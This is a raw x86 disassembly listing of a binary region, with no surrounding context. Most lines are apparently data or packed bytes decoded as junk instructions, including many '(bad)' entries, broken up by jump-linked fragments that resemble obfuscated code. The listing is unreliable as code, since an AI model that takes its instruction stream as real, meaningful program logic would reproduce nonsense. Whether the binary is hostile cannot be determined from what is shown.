  407234:	mov    dl,0xc4
  407236:	ja     0x407221
  407238:	xor    DWORD PTR [ebx-0x4870d6da],edi
  40723e:	mov    BYTE PTR [eax-0x19],0x4b
  407242:	aam    0x25
  407244:	jnp    0x4072a1
  407246:	jnp    0x4071ca
  407248:	push   ds
  407249:	retf   0x166
  40724c:	imul   esi,ecx,0x2980303f
  407252:	sbb    ah,BYTE PTR [eax-0x3d0d5e4e]
  407258:	popf   
  407259:	out    dx,al
  40725a:	mov    WORD PTR [eax+0x5f3fe6e1],ds
  407260:	mov    ebp,0xf5f15a56
  407265:	xchg   ebp,eax
  407266:	pop    ebp
  407267:	fucom  st(4)
  407269:	(bad)
  40726c:	lods   al,BYTE PTR ds:[esi]
  40726d:	push   esp
  40726e:	(bad)  [esi+0x5e]
  407271:	(bad)  
  407272:	pop    edi
  407273:	fisubr WORD PTR [ebx]
  407275:	popf   
  407276:	push   edi
  407277:	fld    DWORD PTR [ebp+esi*1+0x7f]
  40727b:	pop    edx
  40727c:	mov    eax,ds:0x689fcd3b
  407281:	shr    DWORD PTR [edi-0x3a],0x49
  407285:	je     0x4072aa
  407287:	aad    0x99
  407289:	sub    DWORD PTR [eax],ebp
  40728b:	shl    DWORD PTR [ebx+0x43f3ce69],cl
  407291:	dec    edx
  407292:	rol    esi,1
  407294:	add    eax,0x2a84aa00
  407299:	(bad)  
  40729b:	fsubr  st,st(3)
  40729d:	sub    eax,0x5dd668de
  4072a2:	lds    eax,FWORD PTR [ebx+0x4ba68bdd]
  4072a8:	(bad)
  4072ab:	imul   ecx,DWORD PTR [ebx+0x53fb3b4a],0x6f
  4072b2:	jb     0x407272
  4072b4:	enter  0x6615,0xaf
  4072b8:	popf   
  4072b9:	fcom   DWORD PTR [eax]
  4072bb:	bound  edx,QWORD PTR [ebx+0x39fafbc4]
  4072c1:	fidivr WORD PTR [eax+ebx*4+0x63d6ebf3]
  4072c8:	addr16 out dx,al
  4072ca:	test   DWORD PTR [ebp+0x6f],eax
  4072cd:	and    ebp,0xfd6441b3
  4072d3:	or     dh,BYTE PTR [esi]
  4072d5:	xor    bh,BYTE PTR [edx+0x3c8a13c9]
  4072db:	fxch   st(6)
  4072dd:	aam    0xb0
  4072df:	(bad)  
  4072e0:	mov    ecx,0x3dcc608c
  4072e5:	push   ebp
  4072e6:	mov    cs,WORD PTR [edx]
  4072e8:	mov    ecx,0x5ed3b71b
  4072ed:	add    DWORD PTR [esi],ecx
  4072ef:	je     0x4072e2
  4072f1:	in     eax,dx
  4072f2:	sub    ecx,DWORD PTR [edx]
  4072f4:	popa   
  4072f5:	xchg   ecx,eax
  4072f6:	in     eax,0xeb
  4072f8:	cmp    dh,BYTE PTR [esi+0x55f74e71]
  4072fe:	enter  0xd94d,0x46
  407302:	and    ah,BYTE PTR [ecx]
  407304:	and    ebp,DWORD PTR [eax]
  407306:	repnz adc eax,0x8c062991
  40730c:	xchg   ecx,eax
  40730d:	call   0x1e20:0x9beaba94
  407314:	mov    ch,0x8b
  407316:	inc    ebp
  407317:	clc    
  407318:	and    ecx,0x67ef
  40731e:	mov    ecx,0x7510856
  407323:	push   esi
  407324:	mov    esi,DWORD PTR ds:0x430646
  40732a:	sub    DWORD PTR ds:0x43059a,esi
  407330:	xor    eax,ecx
  407332:	mov    esi,0x32729d
  407337:	sub    DWORD PTR ds:0x42e862,0x4305aa
  407341:	add    eax,esi
  407343:	jmp    0x4074db
  407348:	mov    dl,BYTE PTR [ebp-0x1]
  40734b:	mov    BYTE PTR [ebp+eax*1-0x58],dl
  40734f:	mov    DWORD PTR ds:0x4305b6,0x7329
  407359:	inc    eax
  40735a:	jmp    0x4074db
  40735f:	mov    WORD PTR [esi],cs
  407361:	jbe    0x407315
  407363:	pushf  
  407364:	pop    edx
  407365:	dec    esp
  407366:	fsub   DWORD PTR [edi-0x21fddca4]
  40736c:	or     BYTE PTR [ebp+0x27],bl
  40736f:	or     edi,ecx
  407371:	jle    0x4073f1
  407373:	sar    BYTE PTR [edi+0x7e],cl
  407376:	jle    0x40739a
  407378:	sahf   
  407379:	fcomp  DWORD PTR [ebx+0x24]
  40737c:	xlat   BYTE PTR ds:[ebx]
  40737d:	addr16 push ds
  40737f:	das    
  407380:	popf   
  407381:	pop    esp
  407382:	jp     0x40733f
  407384:	cmc    
  407385:	push   ebx
  407386:	sahf   
  407387:	(bad)  
  407389:	mov    al,ds:0x4c1802bc
  40738e:	mov    bh,0x7a
  407390:	cmp    DWORD PTR [ebx+0x7f],edi
  407393:	mov    al,ds:0xf8eb604
  407398:	test   DWORD PTR [eax+0x5a5ed3be],eax
  40739e:	inc    eax
  40739f:	enter  0x57d9,0x79
  4073a3:	test   DWORD PTR [edx-0x5b57ae9a],0xe957d580
  4073ad:	sub    bl,dl
  4073af:	jbe    0x4073f2
  4073b1:	loop   0x407402
  4073b3:	sbb    eax,0xf5a101e5
  4073b8:	xor    al,0x57
  4073ba:	das    
  4073bb:	mov    ah,0xdf
  4073bd:	jns    0x4073a5
  4073bf:	inc    eax
  4073c0:	retf   0xc9ca
  4073c3:	inc    ecx
  4073c4:	lods   eax,DWORD PTR ds:[esi]
  4073c5:	mov    ah,0xec
  4073c7:	fild   WORD PTR [edi]
  4073c9:	or     ah,BYTE PTR [eax+eiz*8]
  4073cc:	inc    edi
  4073cd:	mov    dh,0x1c
  4073cf:	cmp    DWORD PTR [edi-0x20a576b6],eax
  4073d5:	jmp    0xb617:0x8bd95a01
  4073dc:	push   ebx
  4073dd:	jnp    0x407429
  4073df:	cmp    eax,0xbfd44b98
  4073e4:	xchg   ebp,eax
  4073e5:	test   BYTE PTR [esi],cl
  4073e7:	clts   
  4073e9:	pop    esi
  4073ea:	mov    DWORD PTR [edx-0x46],edi
  4073ed:	repnz hlt 
  4073ef:	(bad)  
  4073f0:	jmp    0x4073ae
  4073f2:	mov    esp,0xec49bb29
  4073f7:	je     0x4073ab
  4073f9:	call   0xad0f:0xc953800b
  407400:	mov    ch,0xf8
  407402:	mov    ds:0x20dadafd,eax
  407407:	sbb    DWORD PTR [eax+0x81f6e69],0x49
  40740e:	dec    edx
  40740f:	adc    DWORD PTR [ebp+0x38],eax
  407412:	cs test eax,0x49d6664f
  407418:	add    DWORD PTR ds:0xa057fd69,ecx
  40741e:	repnz inc edi
  407420:	xchg   edi,eax
  407421:	push   esp
  407422:	mov    ecx,0x912fa914
  407427:	push   ecx
  407428:	jecxz  0x4073c6
  40742a:	pop    edi
  40742b:	sub    DWORD PTR [ebx],ecx
  40742d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40742e:	add    ah,bl
  407430:	in     eax,dx
  407431:	jl     0x407496
  407433:	outs   dx,BYTE PTR ds:[esi]
  407434:	ins    DWORD PTR es:[edi],dx
  407435:	mov    edi,0xa7a1855
  40743a:	jmp    0x2260:0x255c2fb3
  407441:	shr    BYTE PTR [ecx],cl
  407443:	mov    ecx,0x12fe1dbc
  407448:	mov    bh,0x68
  40744a:	mov    WORD PTR [esi+0x4e],gs
  40744d:	xchg   ebp,eax
  40744e:	hlt    
  40744f:	dec    ebp
  407450:	push   0x74b2d75
  407455:	sbb    eax,0xab4a1aaf
  40745a:	xor    ch,0x79
  40745d:	inc    esi
  40745e:	pop    esp
  40745f:	mov    ah,0xfd
  407461:	and    dh,0xf9
  407464:	out    dx,eax
  407465:	xor    al,0xa2
  407467:	mov    al,0x94
  407469:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40746a:	cdq    
  40746b:	pop    ss
  40746c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40746d:	out    0x85,al
  40746f:	mov    BYTE PTR [ebx+0x9f3a6b1],dh
  407475:	loop   0x407438
  407477:	rcl    ah,0x9
  40747a:	jmp    0xca49e139
  40747f:	retf   0x59ce
  407482:	mov    dl,0x70
  407484:	sbb    eax,0x2c05bd6d
  407489:	or     ebx,edi
  40748b:	shr    ebp,cl
  40748d:	push   ebx
  40748e:	jns    0x407486
  407490:	sar    DWORD PTR [esi+0x41eb8362],0x8d
  407497:	pushf  
  407498:	push   ss
  407499:	xchg   edx,eax
  40749a:	cmp    BYTE PTR [ecx+0x367bec15],ah
  4074a0:	xchg   edx,eax
  4074a1:	aad    0x9e
  4074a3:	jmp    0x40744d
  4074a5:	(bad)  
  4074a6:	arpl   WORD PTR [eax+ebp*4+0x5],bp
  4074aa:	dec    edi
  4074ab:	ror    DWORD PTR [esi-0x1619a139],cl
  4074b1:	xor    bh,BYTE PTR [eax]
  4074b3:	inc    esp
  4074b4:	outs   dx,BYTE PTR ds:[esi]
  4074b5:	fs jp  0x407498
  4074b8:	aam    0x3c
  4074ba:	scas   al,BYTE PTR es:[edi]
  4074bb:	sti    
  4074bc:	xor    DWORD PTR [edx],0xc863576
  4074c2:	sbb    dl,BYTE PTR [ebx-0x1f]
  4074c5:	lea    edi,[ecx+0x72fc7f89]
  4074cb:	inc    eax
  4074cc:	add    BYTE PTR [ebx],ch
  4074ce:	ja     0x40753a
  4074d0:	(bad)  
  4074d1:	mov    ecx,0x492824b7
  4074d6:	scas   al,BYTE PTR es:[edi]
  4074d7:	cli    
  4074d8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4074d9:	push   edi
  4074da:	mov    ebx,0xf40f883
  4074df:	and    BYTE PTR [esi+edi*8-0x1],0xff
  4074e4:	mov    edx,DWORD PTR [ebp-0x8]
  4074e7:	mov    eax,DWORD PTR [ebp-0xc]
  4074ea:	xor    edx,ecx
  4074ec:	add    edx,esi
  4074ee:	cmp    edx,eax
  4074f0:	je     0x407cbb
  4074f6:	push   ebx
  4074f7:	push   edi
  4074f8:	jmp    0x407679
  4074fd:	ins    BYTE PTR es:[edi],dx
  4074fe:	lds    edx,FWORD PTR [edx]
  407500:	cmp    BYTE PTR [ebx-0x1002839b],0xf2
  407507:	xchg   dl,dh
  407509:	inc    edx
  40750a:	gs mov ecx,0x7ec0edc7
  407510:	jle    0x4074e4
  407512:	jg     0x407592
  407514:	jle    0x4074cf
  407516:	out    0xde,al
  407518:	jl     0x407500
  40751a:	test   eax,0x2d5cd2e9
  40751f:	jne    0x407558
  407521:	pop    edi
  407522:	test   cl,ah
  407524:	leave  
  407525:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407526:	psrld  mm0,QWORD PTR [edi]
  407529:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40752a:	scas   al,BYTE PTR es:[edi]
  40752b:	out    0xb0,eax
  40752d:	scas   al,BYTE PTR es:[edi]
  40752e:	ins    DWORD PTR es:[edi],dx
  40752f:	lods   al,BYTE PTR ds:[esi]
  407530:	stc    
  407531:	dec    eax
  407532:	mov    dh,0x7a
  407534:	push   DWORD PTR [ebp+ecx*8-0x80]
  407538:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407539:	cs jp  0x4074fb
  40753c:	ins    DWORD PTR es:[edi],dx
  40753d:	leave  
  40753e:	test   esi,ebx
  407540:	sub    bl,cl
  407542:	add    esp,ebp
  407544:	xchg   edi,eax
  407545:	in     al,0xd9
  407547:	icebp  
  407548:	sbb    ecx,esi
  40754a:	in     eax,0x1e
  40754c:	pop    eax
  40754d:	loope  0x407547
  40754f:	dec    ecx
  407550:	les    esp,FWORD PTR [eax-0x3b770e87]
  407556:	scas   eax,DWORD PTR es:[edi]
  407557:	xchg   esi,eax
  407558:	or     eax,0xca0922ce
  40755d:	scas   al,BYTE PTR es:[edi]
  40755e:	push   ebp
  40755f:	into   
  407560:	push   edi
  407561:	clc    
  407562:	and    eax,0x547254d3
  407567:	push   ebp
  407568:	dec    esp
  407569:	mov    al,ds:0x3294b038
  40756e:	mov    esi,0xa4692b28
  407573:	mov    bl,dl
  407575:	mov    ebx,0x96b592fd
  40757a:	nop
  40757b:	pop    esp
  40757c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40757d:	cmp    BYTE PTR [edx],0xbc
  407580:	pop    edi
  407581:	inc    ebp
  407582:	call   0x88b1:0x869bcb55
  407589:	add    al,0xf4
  40758b:	(bad)  
  40758d:	loopne 0x407584
  40758f:	push   edi
  407590:	cmp    esp,esp
  407592:	cmp    esi,ecx
  407594:	ror    BYTE PTR [edx+0x39],0x84
  407598:	mov    eax,ds:0x57d5256e
  40759d:	popa   
  40759e:	inc    eax
  40759f:	(bad)  
  4075a0:	ins    BYTE PTR es:[edi],dx
  4075a1:	jno    0x40759f
  4075a3:	clc    
  4075a4:	add    eax,0xea2a7a35
  4075a9:	add    edi,DWORD PTR [ebx]
  4075ab:	dec    esi
  4075ac:	adc    ebp,DWORD PTR [edi-0x7b]
  4075af:	mov    ds:0x86853d77,eax
  4075b4:	jo     0x4075d1
  4075b6:	out    0xa2,al
  4075b8:	cmp    bh,bl
  4075ba:	scas   eax,DWORD PTR es:[edi]
  4075bb:	mov    cl,ch
  4075bd:	or     DWORD PTR [eax],ebp
  4075bf:	sbb    al,0xe4
  4075c1:	je     0x407563
  4075c3:	out    dx,al
  4075c4:	sbb    al,0x82
  4075c6:	repnz fstp QWORD PTR ds:0x49d1
  4075cc:	cdq    
  4075cd:	call   0xce9380ee
  4075d2:	repnz sbb BYTE PTR [esi-0x338bad20],0xe6
  4075da:	sub    eax,0x618791e9
  4075df:	mov    ds:0x1eb8b1d9,al
  4075e4:	cwde   
  4075e5:	ret    
  4075e6:	(bad)  
  4075e7:	loop   0x40757a
  4075e9:	add    DWORD PTR [ebx],eax
  4075eb:	out    0x6,al
  4075ed:	test   al,0xf2
  4075ef:	fcomp  DWORD PTR [ebx+0x13]
  4075f2:	scas   eax,DWORD PTR es:[edi]
  4075f3:	adc    DWORD PTR [eax+ecx*2],edx
  4075f6:	arpl   WORD PTR [ebp-0x4a56677b],bx
  4075fc:	rol    DWORD PTR [eax+0x20470e6],0x9d
  407603:	loopne 0x40764a
  407605:	dec    ebx
  407606:	scas   eax,DWORD PTR es:[edi]
  407607:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407608:	or     eax,DWORD PTR [ebx+ebx*8+0x5a2a3]
  40760f:	adc    bh,BYTE PTR [edi+0x22f22e15]
  407615:	cmp    ah,BYTE PTR [esi+edx*4-0x1c]
  407619:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40761a:	pop    edx
  40761b:	ret    
  40761c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40761d:	sbb    edx,DWORD PTR [eax]
  40761f:	or     eax,0xaf13a1b5
  407624:	push   0xffffffed
  407626:	call   0xc14e:0x623514b7
  40762d:	and    ah,bl
  40762f:	push   ss
  407630:	mov    bh,0x93
  407632:	lock psrad mm5,QWORD PTR [esi-0x14422b35]
  40763a:	dec    ebp
  40763b:	js     0x407604
  40763d:	jg     0x4076bb
  40763f:	xor    BYTE PTR [edi],cl
  407641:	cwde   
  407642:	call   0xdb25:0x7e488157
  407649:	mov    ebp,0x1eadb8bb
  40764e:	loopne 0x40760c
  407650:	push   es
  407651:	cwde   
  407652:	xchg   ebp,eax
  407653:	cmp    ch,BYTE PTR [edx+edx*8+0x18]
  407657:	pop    edi
  407658:	jge    0x4076d3
  40765a:	inc    eax
  40765b:	cmp    al,0xc7
  40765d:	dec    ebx
  40765e:	lods   eax,DWORD PTR ds:[esi]
  40765f:	xchg   edx,eax
  407660:	mov    ah,0x91
  407662:	sbb    DWORD PTR [edx+0x74],eax
  407665:	aas    
  407666:	push   es
  407667:	jo     0x40767f
  407669:	adc    al,0xfa
  40766b:	(bad)  
  40766d:	push   edi
  40766e:	outs   dx,DWORD PTR ds:[esi]
  40766f:	imul   ecx,esi,0xffffff81
  407672:	adc    BYTE PTR ss:[ebx+0x28],dh
  407676:	adc    al,0x2
  407678:	ret    
  407679:	mov    edi,DWORD PTR [ebp+0x8]
  40767c:	jmp    0x4077fd
  407681:	jae    0x40766e
  407683:	cmp    al,ah
  407685:	cli    
  407686:	vpaddw ymm3,ymm2,YMMWORD PTR [eax+eax*1]
  40768b:	inc    DWORD PTR [ecx]
  40768d:	mov    esp,0x41e19ac0
  407692:	sar    DWORD PTR [esi+0x7e],0xd2
  407696:	jg     0x407716
  407698:	jle    0x407704
  40769a:	push   esi
  40769b:	outs   dx,DWORD PTR ds:[esi]
  40769c:	enter  0x7b07,0x6
  4076a0:	sbb    ebp,DWORD PTR [esi-0x530121a3]
  4076a6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4076a7:	fcomp  st(0)
  4076a9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4076aa:	sub    eax,0x82e695dd
  4076af:	pop    ds
  4076b0:	jns    0x407665
  4076b2:	ds push eax
  4076b4:	xchg   edx,eax
  4076b5:	and    al,0x63
  4076b7:	xchg   ebp,eax
  4076b8:	or     BYTE PTR [edx-0x5647e4eb],bh
  4076be:	push   esi
  4076bf:	mov    al,ds:0x59c6502
  4076c4:	and    al,bl
  4076c6:	scas   eax,DWORD PTR es:[edi]
  4076c7:	mov    dh,0x9f
  4076c9:	aam    0x12
  4076cb:	test   DWORD PTR [eax+0xbd8c514],0x7c4fb5e2
  4076d5:	sar    BYTE PTR [ebp-0x3b],cl
  4076d8:	mov    edx,0x73388980
  4076dd:	sub    BYTE PTR [ecx],bl
  4076df:	inc    esi
  4076e0:	cli    
  4076e1:	add    eax,0xd90de80e
  4076e6:	pop    ds
  4076e7:	xor    eax,0xe5fc050f
  4076ec:	xchg   edx,eax
  4076ed:	add    DWORD PTR [esi-0x76],ebp
  4076f0:	add    al,0xa7
  4076f2:	push   0x5bc0078a
  4076f7:	lahf   
  4076f8:	pop    esi
  4076f9:	and    BYTE PTR [ecx+ebx*1+0x39],0x6b
  4076fe:	jle    0x407695
  407700:	mov    ebx,0xc699d861
  407705:	inc    eax
  407706:	outs   dx,DWORD PTR ds:[esi]
  407707:	test   al,0xb7
  407709:	call   0xb321779a
  40770e:	push   0x71
  407710:	outs   dx,DWORD PTR ds:[esi]
  407711:	xor    ch,0x30
  407714:	dec    edi
  407715:	inc    eax
  407716:	scas   al,BYTE PTR es:[edi]
  407717:	aad    0x4e
  407719:	mov    ebx,0xac1211c
  40771e:	sbb    al,0x42
  407720:	test   ch,cl
  407722:	cld    
  407723:	sbb    ah,BYTE PTR [edx+0x49]
  407726:	and    al,0x25
  407728:	mov    cl,0xa2
  40772a:	jnp    0x40776e
  40772c:	test   BYTE PTR [ebp+0x3a],0x64
  407730:	sbb    DWORD PTR [esi],ecx
  407732:	test   BYTE PTR [ebx+0x61],ch
  407735:	adc    eax,0xa766abbe
  40773a:	(bad)  
  40773b:	pop    ebp
  40773c:	mov    ebx,0xb211e151
  407741:	loope  0x40775f
  407743:	imul   ebp,DWORD PTR gs:[ebx-0x57caab07],0x27
  40774b:	call   ebx
  40774d:	adc    BYTE PTR [esp+eiz*2-0x76],al
  407751:	push   edx
  407752:	sbb    DWORD PTR [ebp-0x60],ebx
  407755:	and    ebx,DWORD PTR [ebx]
  407757:	or     esi,DWORD PTR [esi+eax*2+0x45b4ae28]
  40775e:	imul   ebx,DWORD PTR [ecx+0x66],0x3d
  407762:	stc    
  407763:	jbe    0x40773d
  407765:	or     al,0x66
  407767:	das    
  407768:	push   esi
  407769:	sbb    eax,0x85b4dd9b
  40776e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40776f:	arpl   WORD PTR [ebx],si
  407771:	xlat   BYTE PTR ds:[ebx]
  407772:	inc    ebp
  407773:	ror    BYTE PTR [ebp-0x25],1
  407776:	xchg   esp,eax
  407777:	xlat   BYTE PTR ds:[ebx]
  407778:	out    0x58,eax
  40777a:	lock retf 0x1d3e
  40777e:	mov    ecx,0x69ff171a
  407783:	into   
  407784:	dec    ebx
  407785:	shl    DWORD PTR [esi-0x2f],1
  407788:	pop    ebx
  407789:	mov    ebx,0xbaec514c
  40778e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40778f:	test   al,0xbb
  407791:	jg     0x407789
  407793:	mov    al,ch
  407795:	jns    0x4077e0
  407797:	stc    
  407798:	inc    esp
  407799:	nop
  40779a:	(bad)  
  40779b:	jmp    0x4077eb
  40779d:	addr16 pop es
  40779f:	inc    eax
  4077a0:	rcr    BYTE PTR [edx+0x6d],cl
  4077a3:	(bad)  
  4077a4:	(bad)  
  4077a5:	or     eax,0x7cfb74eb
  4077aa:	cdq    
  4077ab:	jnp    0x407743
  4077ad:	or     esp,DWORD PTR [ebp-0x77]
  4077b0:	sbb    al,0x4e
  4077b2:	xchg   edx,eax
  4077b3:	dec    edi
  4077b4:	in     eax,dx
  4077b5:	lods   eax,DWORD PTR ds:[esi]
  4077b6:	xor    eax,0x80eface1
  4077bb:	cmp    eax,0xb8ed6348
  4077c0:	push   cs
  4077c1:	pop    edi
  4077c2:	ins    DWORD PTR es:[edi],dx
  4077c3:	pop    ss
  4077c4:	xchg   edi,eax
  4077c5:	xor    eax,0x698595fb
  4077ca:	cdq    
  4077cb:	pop    DWORD PTR [edx-0x643f9bb0]
  4077d1:	enter  0x7506,0xbe
  4077d5:	sahf   
  4077d6:	jne    0x4077f1
  4077d8:	push   0xd78606b0
  4077dd:	and    BYTE PTR [ecx+eiz*2-0x26f0380c],dl
  4077e4:	shl    ebx,cl
  4077e6:	xor    esi,DWORD PTR [ecx+0x1aff07c0]
  4077ec:	cmp    esi,DWORD PTR [eax]
  4077ee:	xchg   esi,eax
  4077ef:	retf   0x153e
  4077f2:	and    BYTE PTR [ebx-0x62],dh
  4077f5:	push   ds
  4077f6:	inc    eax
  4077f7:	pop    eax
  4077f8:	cmp    eax,0x84c3d04e
  4077fd:	mov    eax,0x8a40
  407802:	xor    ax,WORD PTR [edi+edx*4+0x2]
  407807:	mov    edi,0x3b06
  40780c:	add    ax,di
  40780f:	jmp    0x407990
  407814:	push   ebp
  407815:	fsub   DWORD PTR [edx+0x557cbb2e]
  40781b:	pop    ebp
  40781c:	xchg   ecx,esp
  40781e:	push   0xd
  407820:	mov    eax,ds:0x25faac8a
  407825:	ret    
  407826:	jle    0x4078a6
  407828:	sar    BYTE PTR [edi+0x7e],cl
  40782b:	jle    0x407863
  40782d:	je     0x40788d
  40782f:	addr16 (bad) 
  407832:	lods   eax,DWORD PTR ds:[esi]
  407833:	iret   
  407834:	push   eax
  407835:	ins    DWORD PTR es:[edi],dx
  407836:	(bad)  
  407838:	cmp    eax,DWORD PTR [edx+0x32ef69b9]
  40783e:	dec    eax
  40783f:	dec    eax
  407840:	xchg   BYTE PTR [esi-0x172f141b],ch
  407846:	and    ebp,DWORD PTR [edi]
  407848:	cmp    eax,0x5e580d91
  40784d:	pop    ebx
  40784e:	aas    
  40784f:	push   0xffffffe8
  407851:	cmp    al,0xb1
  407853:	sar    DWORD PTR [edi-0x66],cl
  407856:	sub    BYTE PTR [eax-0x1bc958b1],bh
  40785c:	loope  0x40782d
  40785e:	popa   
  40785f:	out    0x74,al
  407861:	lods   eax,DWORD PTR ds:[esi]
  407862:	ins    DWORD PTR es:[edi],dx
  407863:	retf   0x88e4
  407866:	mov    ebp,0xc5f65346
  40786b:	sub    al,0x4a
  40786d:	inc    ecx
  40786e:	out    dx,al
  40786f:	or     al,0x50
  407871:	dec    ebp
  407872:	inc    ebx
  407873:	push   es
  407874:	inc    ecx
  407875:	adc    BYTE PTR [ebx],0x52
  407878:	or     BYTE PTR [ebp-0x772aa213],dh
  40787e:	dec    ebp
  40787f:	js     0x407818
  407881:	outs   dx,BYTE PTR ds:[esi]
  407882:	clc    
  407883:	push   esi
  407884:	cmc    
  407885:	push   es
  407886:	lea    bx,[ecx]
  407889:	mov    ebx,0x7f17b746
  40788e:	pop    esp
  40788f:	pop    es
  407890:	cwde   
  407891:	add    al,0xf8
  407893:	pop    ebp
  407894:	aad    0x3b
  407896:	(bad)  
  407897:	pop    ebx
  407898:	scas   eax,DWORD PTR es:[edi]
  407899:	movaps xmm6,xmm7
  40789c:	ins    DWORD PTR es:[edi],dx
  40789d:	ins    BYTE PTR es:[edi],dx
  40789e:	adc    BYTE PTR [eax+0x64],0x46
  4078a2:	sub    edx,esp
  4078a4:	pop    ds
  4078a5:	(bad)  
  4078a6:	(bad)  
  4078a7:	daa    
  4078a8:	out    0x6c,eax
  4078aa:	inc    ecx
  4078ab:	jl     0x407923
  4078ad:	add    al,0x67
  4078af:	xchg   BYTE PTR [ebx+0x199a147d],ch
  4078b5:	cmp    DWORD PTR [esi],ebp
  4078b7:	(bad)  [edi+0x731f3e6d]
  4078bd:	fsub   DWORD PTR [eax-0x4e]
  4078c0:	jl     0x4078ac
  4078c2:	xchg   ebp,eax
  4078c3:	daa    
  4078c4:	call   0x7ea7:0x944f66e6
  4078cb:	retf   0x985
  4078ce:	and    dl,BYTE PTR ds:0x181271ed
  4078d4:	mov    ebp,0x183a01da
  4078d9:	retf   0x289f
  4078dc:	int    0x28
  4078de:	es jnp 0x407871
  4078e1:	inc    cx
  4078e3:	xor    ebp,esi
  4078e5:	fsub   st(5),st
  4078e7:	inc    ecx
  4078e8:	xchg   DWORD PTR [edi],esp
  4078ea:	popa   
  4078eb:	mov    ch,0xd4
  4078ed:	sti    
  4078ee:	leave  
  4078ef:	ror    BYTE PTR [eax+0x26],1
  4078f2:	fnstenv [ecx+0x7]
  4078f5:	nop
  4078f6:	xchg   edi,eax
  4078f7:	repnz aad 0x69
  4078fa:	lds    edi,FWORD PTR [edi-0x4d]
  4078fd:	inc    esp
  4078fe:	push   cs
  4078ff:	imul   ebp,DWORD PTR [eax+0x35],0xfffffff8
  407903:	ins    BYTE PTR es:[edi],dx
  407904:	int3   
  407905:	pop    ds
  407906:	pop    ebp
  407907:	or     ebx,DWORD PTR [esi-0xfd70c00]
  40790d:	add    ah,BYTE PTR cs:[ebx-0xc684d4e]
  407914:	cli    
  407915:	xor    DWORD PTR [ebx+0x16],esi
  407918:	jns    0x40794a
  40791a:	movaps XMMWORD PTR [ecx],xmm1
  40791d:	cmp    DWORD PTR [ebx+0x30fcc576],esp
  407923:	jbe    0x4078a8
  407925:	jg     0x4078f2
  407927:	sub    BYTE PTR [ebx-0xf],ch
  40792a:	mov    edx,0x3048cb5e
  40792f:	aam    0xd2
  407931:	push   0xffffffea
  407933:	into   
  407934:	sbb    DWORD PTR [ecx-0x4a],edi
  407937:	adc    eax,edx
  407939:	rcr    BYTE PTR [esi-0x55],1
  40793c:	fistp  DWORD PTR [ebp+0x2ef06f58]
  407942:	ror    DWORD PTR [edx+eiz*2+0x4c],1
  407946:	mov    ds:0x94614bbe,al
  40794b:	push   ecx
  40794c:	das    
  40794d:	test   DWORD PTR ds:0xcf6b302e,ebp
  407953:	lea    esi,[eax+ebp*4+0x7b]
  407957:	in     al,dx
  407958:	cli    
  407959:	dec    ecx
  40795a:	pop    edi
  40795b:	enter  0xd869,0x1b
  40795f:	push   ecx
  407960:	cmp    DWORD PTR [ebp+0xf],ecx
  407963:	mov    bh,0x8e
  407965:	and    esp,DWORD PTR [esi-0xecc0174]
  40796b:	repnz mov ah,BYTE PTR [eax-0x5f]
  40796f:	cmc    
  407970:	int    0xcf
  407972:	add    DWORD PTR [edx],eax
  407974:	mov    ds:0x54df0a46,eax
  407979:	mov    bh,0x4a
  40797b:	inc    ebx
  40797c:	mov    ds:0x973d46ea,eax
  407981:	ret    0x95a5
  407984:	and    BYTE PTR [edi],bl
  407986:	(bad)  
  407987:	iret   
  407988:	sbb    BYTE PTR [ebx],dh
  40798a:	mov    ds:0x5b079458,al
  40798f:	inc    esi
  407990:	movzx  eax,ax
  407993:	mov    DWORD PTR [ebp-0x14],eax
  407996:	jmp    0x407b17
  40799b:	xchg   ebx,eax
  40799c:	(bad)  
  40799d:	sbb    ebp,edi
  40799f:	cmp    edi,DWORD PTR [ebx+0x6b]
  4079a2:	inc    edx
  4079a3:	push   sp
  4079a5:	cwde   
  4079a6:	pop    edi
  4079a7:	and    bl,BYTE PTR [ecx+0x28]
  4079aa:	sub    DWORD PTR [ecx-0x2d81813c],ebx
  4079b0:	jg     0x407a30
  4079b2:	jle    0x4079a4
  4079b4:	loopne 0x4079b2
  4079b6:	cmp    DWORD PTR [ebx],0x2a
  4079b9:	jp     0x407a1c
  4079bb:	fbstp  TBYTE PTR [esi+0x6c]
  4079be:	pushf  
  4079bf:	ja     0x4079af
  4079c1:	ss jns 0x4079b7
  4079c4:	(bad)
  4079c8:	fwait
  4079c9:	test   BYTE PTR [edx+0x6882877e],ah
  4079cf:	ins    DWORD PTR es:[edi],dx
  4079d0:	iret   
  4079d1:	inc    ebp
  4079d2:	or     DWORD PTR [ecx+eax*8+0x7f34ad54],ebp
  4079d9:	xor    DWORD PTR [ebx+edi*2+0x58],ebx
  4079dd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4079de:	mov    ch,0x4a
  4079e0:	adc    al,0x29
  4079e2:	jp     0x4079ee
  4079e4:	and    cl,BYTE PTR [esi-0x42aa15fb]
  4079ea:	(bad)  
  4079eb:	mov    ah,BYTE PTR [ecx+0x70]
  4079ee:	out    dx,al
  4079ef:	push   ebx
  4079f0:	xchg   ecx,eax
  4079f1:	popf   
  4079f2:	lock je 0x407a0f
  4079f5:	xchg   DWORD PTR [edx+0x18],esp
  4079f8:	xor    edi,ecx
  4079fa:	imul   esi,DWORD PTR [ecx-0x75ec882e],0x4431f8b0
  407a04:	jp     0x407992
  407a06:	rol    eax,0xf2
  407a09:	shr    eax,0x8f
  407a0c:	test   BYTE PTR [esi+esi*8+0x500a8d0],0x65
  407a14:	mov    ds:0xdf362bd3,eax
  407a19:	aad    0x61
  407a1b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407a1c:	ficomp DWORD PTR [esi]
  407a1e:	out    dx,al
